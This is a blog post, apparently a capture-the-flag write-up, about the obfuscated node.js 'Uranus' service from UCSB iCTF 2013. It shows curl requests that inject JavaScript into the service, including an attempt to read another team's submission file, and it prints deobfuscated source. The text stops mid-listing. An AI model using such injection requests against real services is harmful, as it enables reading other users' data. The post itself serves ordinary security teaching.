
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>UCSB iCTF 2013 - The Uranus service - M.G.</title>
  <meta name="author" content="Gábor Molnár">

  
  <meta name="description" content="The uranus service of the UCSB iCTF competition this year was an obfuscated node.js module. Initial exploration It was very easy to get it running &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://gabor.molnar.es/blog/2013/12/13/ucsb-ictf-2013-uranus">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="M.G." type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
<link href='//fonts.googleapis.com/css?family=Open+Sans&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
<!--<link href='//fonts.googleapis.com/css?family=Fjalla+One&subset=latin-ext,latin' rel='stylesheet' type='text/css'>-->
<link href='//fonts.googleapis.com/css?family=Oswald:700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css'>


  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-1277369-13']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">M.G.</a></h1>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:gabor.molnar.es" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">UCSB iCTF 2013 - The Uranus service</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-13T19:43:00+01:00" pubdate data-updated="true">Dec 13<span>th</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>The uranus service of the <a href="http://ictf.cs.ucsb.edu/">UCSB iCTF</a> competition this year was an <a href="/files/uranus.js">obfuscated node.js module</a>.</p>

<!-- more -->

<h2 id="initial-exploration">Initial exploration</h2>

<p>It was very easy to get it running locally (it had no external dependencies besides node.js itself) and explore the basic functionality:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl localhost:1337
</span><span class="line">Welcome to Uranus!
</span><span class="line">With the last update of our nuclear reactor we can now control critical variables of the process
</span><span class="line">through the easyness of JavaScript. Uranus is here to proof-check your code <span class="k">for </span>safety before
</span><span class="line">you submit it directly to the reactor.
</span><span class="line">
</span><span class="line">Use HTTP POST to submit your code.
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;abcd&#39;</span> localhost:1337
</span><span class="line">Your JSON is malformed. Please provide the following properties: flag_id, token, code
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;: 2, &quot;code&quot;: &quot;console.log(1234)&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code is missing an access code to the nuclear reactor. Expected variable according to the
</span><span class="line">documentation is <span class="s2">&quot;password&quot;</span>.
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>When submitting this, the the ‘1234’ string appeared on the server’s stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = 5&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code is missing an access code to the nuclear reactor. Expected variable according to the
</span><span class="line">documentation is <span class="s2">&quot;password&quot;</span>.
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = \&quot;a\&quot;&quot;}&#39;</span> localhost:1337
</span><span class="line">Code approved. Please check your parameters carefully before deploying the code to the nuclear
</span><span class="line">reactor.
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>At this point, the service has created a file in the <code>submissions</code> directory named <code>1-2</code> containing the submitted code.</p>

<p>Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don’t know the token). The flag must be the password that was used when uploading the file.</p>

<p>Let’s try to read a file with the submitted code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 2, &quot;token&quot;: 3, &quot;code&quot;: &quot;console.log(require(\&quot;fs\&quot;).readFileSync(\&quot;submissions/1-2\&quot;))&quot;}&#39;</span> localhost:1337
</span><span class="line">Your code has runtime errors: ReferenceError: require is not defined
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><code>require</code> is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files… After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.</p>

<h2 id="deobfuscation">Deobfuscation</h2>

<p>The source code looked terribly obfuscated, but fortunately, the obfuscation <em>seemed</em> to be easy to revert. The obfuscated code worked like this:</p>

<ol>
  <li>Fill an array with seemingly random bytes</li>
  <li>Do some magic</li>
  <li><code>eval()</code> the resulting string</li>
</ol>

<p>Replacing the <code>eval()</code> with <code>console.log()</code> showed the deobfuscated source code. After prettifying the resulting code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
<span class="line-number">111</span>
<span class="line-number">112</span>
<span class="line-number">113</span>
<span class="line-number">114</span>
<span class="line-number">115</span>
<span class="line-number">116</span>
<span class="line-number">117</span>
<span class="line-number">118</span>
<span class="line-number">119</span>
<span class="line-number">120</span>
<span class="line-number">121</span>
<span class="line-number">122</span>
<span class="line-number">123</span>
<span class="line-number">124</span>
<span class="line-number">125</span>
<span class="line-number">126</span>
<span class="line-number">127</span>
<span class="line-number">128</span>
<span class="line-number">129</span>
<span class="line-number">130</span>
<span class="line-number">131</span>
<span class="line-number">132</span>
<span class="line-number">133</span>
<span class="line-number">134</span>
<span class="line-number">135</span>
<span class="line-number">136</span>
<span class="line-number">137</span>
<span class="line-number">138</span>
<span class="line-number">139</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">U8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">,</span> <span class="nx">S8</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">D8</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nx">C8</span> <span class="o">=</span> <span class="s1">&#39;return &#39;</span><span class="p">,</span> <span class="nx">e8</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x1B2</span><span class="p">,</span> <span class="mi">95</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">45</span><span class="p">,</span> <span class="mf">92.60E1</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.07E2</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">110</span><span class="p">.,</span> <span class="mf">6.2E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x179</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="p">(</span><span class="mi">129</span><span class="p">,</span> <span class="mf">9.4E2</span><span class="p">));</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mh">0x1EF</span><span class="p">,</span> <span class="mi">21</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">1.18E3</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x139</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">32</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.97E2</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">6.350E2</span><span class="p">,</span> <span class="mi">97</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mh">0x1F9</span> <span class="o">?</span> <span class="p">(</span><span class="mi">39</span><span class="p">.,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">31.3E1</span><span class="p">,</span> <span class="mh">0x1B5</span><span class="p">)))</span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">r8</span> <span class="o">=</span> <span class="p">((</span><span class="mi">117</span><span class="p">.,</span> <span class="mi">140</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x18A</span><span class="p">,</span> <span class="mi">138</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0xA9</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">17</span><span class="p">.,</span> <span class="mf">1.71E2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x212</span><span class="p">,</span> <span class="mi">58</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">147.8E1</span><span class="p">,</span> <span class="mi">130</span><span class="p">)</span> <span class="o">:</span> <span class="mh">0x106</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">33</span><span class="p">.,</span> <span class="mh">0x226</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">26</span><span class="p">.,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1D2</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">));</span> <span class="nx">r8</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mf">54.30E1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mf">1.5E1</span><span class="p">,</span> <span class="mf">7.390E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mf">38.1E1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1F9</span><span class="p">,</span> <span class="mh">0x133</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">79.10E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">68</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">133.1E1</span><span class="p">,</span> <span class="mi">81</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x173</span> <span class="o">?</span> <span class="p">(</span><span class="mi">22</span><span class="p">.,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.241E3</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">));)</span><span class="nx">D8</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">?</span> <span class="p">((</span><span class="mi">76</span><span class="p">,</span> <span class="mh">0x167</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">6.2E2</span><span class="p">,</span> <span class="mf">12.93E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">18.0E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x127</span><span class="p">,</span> <span class="mf">90.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">1.16E2</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.96E2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">10.93E2</span><span class="p">,</span> <span class="mf">22.8E1</span><span class="p">))</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x1F8</span><span class="p">,</span> <span class="mh">0x1FE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">30.1E1</span><span class="p">,</span> <span class="mi">124</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">31</span><span class="p">.,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">37.80E1</span><span class="p">,</span> <span class="mf">110.7E1</span><span class="p">))))</span> <span class="o">?</span> <span class="nx">Z8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="p">)</span> <span class="o">:</span> <span class="s2">&quot;@%)eitg)(tDwn&quot;</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="o">--</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">S8</span> <span class="o">===</span> <span class="p">((</span><span class="mf">49.5E1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">61</span><span class="p">,</span> <span class="mh">0x20D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">56.6E1</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">147</span><span class="p">,</span> <span class="mi">106</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x15</span><span class="p">,</span> <span class="mi">131</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">109</span><span class="p">.,</span> <span class="mf">95.2E1</span><span class="p">))</span> <span class="o">?</span> <span class="p">[(</span><span class="mf">145.5E1</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">4.11E2</span><span class="p">,</span> <span class="mh">0x1C5</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x244</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="mf">14.67E2</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">119</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">75.4E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x16D</span><span class="p">,</span> <span class="mi">106</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">.</span> <span class="o">?</span> <span class="mh">0x222</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.64E2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">))].</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="nx">C8</span> <span class="o">+</span> <span class="nx">D8</span><span class="p">)()</span> <span class="o">:</span> <span class="nx">S8</span> <span class="o">^</span> <span class="nx">Z8</span>
</span><span class="line">  <span class="p">})(</span><span class="s2">&quot;_9(mTe.)ea e(&quot;</span><span class="p">,</span> <span class="p">((</span><span class="mh">0x127</span><span class="p">,</span> <span class="mh">0x216</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">130.6E1</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">2.36E2</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">.,</span> <span class="mi">142</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x251</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">128.0E1</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x19</span><span class="p">,</span> <span class="mf">90.30E1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">127</span><span class="p">,</span> <span class="mf">9.5E2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span> <span class="mf">9.540E2</span><span class="p">)));</span>
</span><span class="line">  <span class="k">return</span> <span class="p">{</span><span class="nx">J8</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">H8</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">g8</span><span class="p">,</span> <span class="nx">R8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">1.414E3</span><span class="p">,</span> <span class="mi">117</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">70</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.0E1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">73.5E1</span><span class="p">,</span> <span class="mf">147.70E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">2.5E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.3980E3</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="mf">98.2E1</span><span class="p">)),</span> <span class="nx">W8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">44.6E1</span><span class="p">,</span> <span class="mf">130.20E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x133</span> <span class="o">?</span> <span class="p">(</span><span class="mf">24.6E1</span><span class="p">,</span> <span class="mh">0x142CF49F580</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">12.9E1</span><span class="p">,</span> <span class="mi">10</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="mi">133</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">107</span><span class="p">.,</span> <span class="mh">0x193</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x240</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">))</span> <span class="o">&gt;</span> <span class="nx">U8</span><span class="p">,</span> <span class="nx">G8</span><span class="p">;</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(;</span> <span class="nx">R8</span> <span class="o">&lt;</span> <span class="nx">H8</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">R8</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">G8</span> <span class="o">=</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">H8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">R8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)).</span><span class="nx">toString</span><span class="p">((</span><span class="mi">14</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x21D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x155</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">42.40E1</span><span class="p">,</span> <span class="mi">141</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mi">76</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">3.25E2</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span> <span class="o">:</span> <span class="mi">132</span><span class="p">.</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x62</span><span class="p">,</span> <span class="mf">11.99E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">94.10E1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x8B</span><span class="p">,</span> <span class="mi">34</span><span class="p">)));</span>
</span><span class="line">      <span class="nx">g8</span> <span class="o">=</span> <span class="nx">R8</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="nx">g8</span> <span class="o">^</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">g8</span> <span class="o">?</span> <span class="nx">W8</span> <span class="o">:</span> <span class="o">!</span><span class="nx">W8</span>
</span><span class="line">  <span class="p">}};</span>
</span><span class="line"><span class="p">})();</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;63&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span> <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span> <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">}</span> <span class="o">:</span> <span class="mi">1337</span><span class="p">;</span>
